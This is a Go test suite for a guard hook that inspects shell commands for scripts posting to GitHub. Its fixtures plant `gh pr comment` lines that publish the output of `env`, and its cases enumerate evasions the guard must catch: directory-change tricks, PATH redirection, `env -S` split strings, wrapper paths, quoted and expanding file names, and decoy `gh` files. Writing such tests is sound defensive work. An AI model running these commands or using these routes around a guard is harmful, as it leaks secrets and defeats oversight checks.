package hook

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// The cases below are the fifth pre-merge evaluation's findings and the first independent review's
// findings, each fixed with a red-first case. They cover the shell state the file rule carries from one
// command of a list to the next, the word reader's quoting, the wrapper's own options and an operand the
// shell expands.

// TestGitHubPostGuardKeepsAnUncertainCdPossible: a cd in a command that may not have run does not decide
// the directory a later operand is read in, so neither directory can hide a posting script behind a clean
// copy in the other.
func TestGitHubPostGuardKeepsAnUncertainCdPossible(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	if err := os.Mkdir(filepath.Join(cwd, "sub"), 0o700); err != nil {
		t.Fatal(err)
	}
	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
	githubPostWrite(t, cwd, "sub/post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	for _, command := range []string{
		"true && cd sub; bash post.sh",
		"false || cd sub; bash post.sh",
		"false && cd sub; bash post.sh",
		"true || cd sub; bash post.sh",
		"while false; do cd sub; done; bash post.sh",
		"if false; then cd sub; fi; bash post.sh",
		"cd sub && bash post.sh",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
	}
	// The controls: a cd that certainly ran reads the moved-to file, and a subshell's cd ends with it, so a
	// later operand is read in the payload's directory again.
	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	githubPostWrite(t, cwd, "sub/post.sh", "echo clean\n")
	for _, command := range []string{"cd sub && bash post.sh"} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, "", "")
	}
	for _, command := range []string{"(cd sub) && bash post.sh", "(cd sub); bash post.sh"} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
	}
}

// TestGitHubPostGuardDoesNotLeakAWrapperState: a wrapper's own option belongs to the child process, so its
// directory or PATH does not persist to the commands after it, and a PATH set for one command does not
// either.
func TestGitHubPostGuardDoesNotLeakAWrapperState(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	if err := os.Mkdir(filepath.Join(cwd, "sub"), 0o700); err != nil {
		t.Fatal(err)
	}
	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
	githubPostWrite(t, cwd, "sub/post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	// The wrapper moved only its own child, so the payload directory's clean script is the one read.
	githubPostWant(t, githubPostShell(t, cwd, "env -C sub true; bash post.sh"),
		"env -C sub true; bash post.sh", "", "")
	evil := t.TempDir()
	githubPostWrite(t, evil, "lib.sh", "gh pr comment 1 -b \"$(env)\"\n")
	githubPostWrite(t, cwd, "lib.sh", "echo hi\n")
	bin := t.TempDir()
	t.Setenv("PATH", bin)
	// A PATH= word on one command does not persist; a bare PATH= word (or an export) does.
	githubPostWant(t, githubPostShell(t, cwd, "env PATH="+evil+" true; source lib.sh"),
		"env PATH=... true; source lib.sh", "", "")
	for _, command := range []string{
		"PATH=" + evil + " true; source lib.sh",
		"PATH=" + evil + "; source lib.sh",
		"export PATH=" + evil + "; source lib.sh",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, filepath.Join(evil, "lib.sh")+":1")
	}
}

// TestGitHubPostGuardPeelsAWrapperPath: a path whose last element names a wrapper the reader peels is that
// wrapper when the file is a binary (/usr/bin/env), so the program after its options is judged; a path that
// is a text script is a file the shell runs, read by the direct-execution rule.
func TestGitHubPostGuardPeelsAWrapperPath(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	for _, command := range []string{
		"env bash post.sh",
		"timeout 30 bash post.sh",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
	}
	// A wrapper path that is a real binary is peeled the same way.
	if _, err := os.Stat("/usr/bin/env"); err == nil {
		for _, command := range []string{"/usr/bin/env bash post.sh", "/usr/bin/timeout 30 bash post.sh"} {
			githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "post.sh:1")
		}
	}
	// The control: a path that is a text script named like a wrapper is read as a file, not peeled.
	githubPostWrite(t, cwd, "env", "gh pr comment 1 -b \"$(env)\"\n")
	for _, command := range []string{"./env", "./env post.sh"} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "./env:1")
	}
}

// TestGitHubPostGuardReadsAQuotedOperandBesideARedirection: the strict reader keeps a quoted operand's
// quoting even when another word in the same command is an unquoted redirection, so the file the operand
// names is the one read.
func TestGitHubPostGuardReadsAQuotedOperandBesideARedirection(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, ">post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	for _, command := range []string{
		"bash '>post.sh' 2>/dev/null",
		"bash '>post.sh' >/dev/null",
		"bash '>post.sh'",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, ">post.sh:1")
	}
	// The control: an unquoted operator is a redirection, so no program file is named.
	githubPostWrite(t, cwd, "post.sh", "echo clean\n")
	githubPostWant(t, githubPostShell(t, cwd, "bash > post.sh"), "bash > post.sh", "", "")
}

// TestGitHubPostGuardRefusesAnExpandingProgramFile: a program file named through an expansion is not the
// literal name, so the guard refuses it rather than reading a decoy of that spelling.
func TestGitHubPostGuardRefusesAnExpandingProgramFile(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	githubPostWrite(t, cwd, "$SCRIPT", "echo clean\n")
	for _, command := range []string{
		"bash \"$SCRIPT\"",
		"source \"$SCRIPT\"",
		". \"$SCRIPT\"",
		"bash $SCRIPT",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "$SCRIPT")
	}
	// The control: a quoted literal name that holds no expansion is read as written.
	githubPostWrite(t, cwd, "clean.sh", "echo hi\n")
	githubPostWant(t, githubPostShell(t, cwd, "bash clean.sh"), "bash clean.sh", "", "")
}

// TestGitHubPostGuardReadsASplitString: env -S and env --split-string re-read their value as shell words
// and run them, so the value is judged as the command text it is.
func TestGitHubPostGuardReadsASplitString(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, "post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	for _, command := range []string{
		"env -S 'bash post.sh'",
		"env --split-string 'bash post.sh'",
		"env -Sbash post.sh",
		"env -S 'gh pr comment 1 -b plain'",
		"env -S'gh pr comment 1 -b plain'",
	} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, githubPostWhereCommand)
	}
	// The controls: a split string that runs no post, and an argv word that only spells a redirection.
	githubPostWant(t, githubPostShell(t, cwd, "env -S 'echo hi'"), "env -S 'echo hi'", "", "")
	githubPostWrite(t, cwd, ">post.sh", "gh pr comment 1 -b \"$(env)\"\n")
	githubPostWant(t, githubPostArgvPayload(t, cwd, "bash", ">post.sh"), "argv bash >post.sh",
		githubPostRuleUnread, ">post.sh:1")
	githubPostWant(t, githubPostArgvPayload(t, cwd, "bash", ";", "post.sh"), "argv bash ; post.sh",
		githubPostRuleUnread, ";")
	// An argv array carries no shell syntax, so a program string the shell would run as its own word stays
	// outside the file rule, as bash -c always has.
	githubPostWant(t, githubPostArgvPayload(t, cwd, "sh", "-c", "bash post.sh"), "argv sh -c 'bash post.sh'", "", "")
}

// TestGitHubPostGuardRefusesAnUnreadablePathScriptNamedGhAtAnySize: a path named gh that the guard cannot
// read as a text script is refused whatever its size, and a path that is not a regular file is refused too.
func TestGitHubPostGuardRefusesAnUnreadablePathScriptNamedGhAtAnySize(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, "gh", "#!/bin/sh\n"+strings.Repeat("#", githubPostMaxFileBytes)+"\ngh pr comment 1 -b \"$(env)\"\n")
	if err := os.Chmod(filepath.Join(cwd, "gh"), 0o700); err != nil {
		t.Fatal(err)
	}
	for _, command := range []string{"./gh pr view 1", "./gh issue list"} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "./gh")
	}
	// A name that is not a regular file is refused as the direct-execution rule refuses it.
	if err := os.Mkdir(filepath.Join(cwd, "ghdir"), 0o700); err != nil {
		t.Fatal(err)
	}
	githubPostWant(t, githubPostShell(t, cwd, "./ghdir pr view 1"), "./ghdir pr view 1", githubPostRuleUnread, "./ghdir")
}

// TestGitHubPostGuardReadsAPathLineInsideAScriptByItsFile: a line of a script that runs a path named gh is
// judged by the direct-execution read, so the file the line runs is read rather than trusted by its name.
func TestGitHubPostGuardReadsAPathLineInsideAScriptByItsFile(t *testing.T) {
	githubPostTempHome(t)
	cwd := t.TempDir()
	t.Setenv("TMPDIR", cwd)
	githubPostWrite(t, cwd, "clean.md", "a clean body\n")
	githubPostWrite(t, cwd, "gh", "#!/bin/sh\ngh pr comment 1 -b \"$(env)\"\n")
	if err := os.Chmod(filepath.Join(cwd, "gh"), 0o700); err != nil {
		t.Fatal(err)
	}
	githubPostWrite(t, cwd, "wrapper.sh", "./gh pr comment 1 --body-file clean.md\n")
	for _, command := range []string{"bash wrapper.sh", "source wrapper.sh"} {
		githubPostWant(t, githubPostShell(t, cwd, command), command, githubPostRuleUnread, "wrapper.sh:1")
	}
	// The control: a clean path named gh inside a script stays allowed.
	githubPostWrite(t, cwd, "gh", "#!/bin/sh\necho hi\n")
	githubPostWrite(t, cwd, "quiet.sh", "./gh pr view 1\n")
	githubPostWant(t, githubPostShell(t, cwd, "bash quiet.sh"), "bash quiet.sh", "", "")
}
